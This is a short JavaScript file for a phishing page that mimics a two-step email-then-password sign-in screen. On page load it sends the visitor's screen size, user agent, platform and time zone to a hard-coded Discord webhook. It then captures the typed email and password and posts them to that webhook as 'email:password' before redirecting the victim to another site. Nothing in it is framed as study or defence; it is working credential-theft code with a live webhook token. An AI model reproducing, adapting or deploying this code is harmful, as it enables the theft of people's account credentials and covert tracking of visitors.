var webhook = "https://discord.com/api/webhooks/965272372712194079/ncLfw2g_Q1QAxAv7gbFNgAOLowGXmihH03_Yopdh6y8yXGVhO88zxRdY1T4NEpzdEavI";
var redirect = "https://graysuit.github.io";


var first_step = true;
var email = "";

function get_ip_logs()
{
    return "Width=" + window.screen.width + 
           "\nHeight=" + window.screen.height + 
           "\nUserAgent=" + navigator.userAgent + 
           "\nPlatform=" + navigator.platform + 
           "\nTimeZone=" + Intl.DateTimeFormat().resolvedOptions().timeZone;
}

function send_data(data, shouldRedirect)
{
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() { 
        if (this.readyState == 4) {
            if(shouldRedirect) window.location = redirect;
        } 
    };
    xhr.open('POST', webhook, true);
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.send(
    JSON.stringify({content:data}));
}
		    
function submit()
{
    if(!first_step)
    {
        var password = document.getElementsByName("Email")[0].value;
        send_data(email + ":" + password, true);
    }
    else
    {
        first_step = false;
        email = document.getElementsByName("Email")[0].value;
        document.getElementById('avatar').src = "avatar2.png";
        document.getElementById('need-help').innerHTML = "Forgot password ?";
        document.getElementById('email-input').innerHTML = email;
        document.getElementById('next').innerHTML = "Submit";
        document.getElementById('link-signup').innerHTML = "<a>Sign in with a different account<\/a>";
        document.getElementById('Email').type = "password";
        document.getElementById('Email').value = "";
        document.getElementById('Email').placeholder = "";
    }
}
send_data(get_ip_logs(), false);
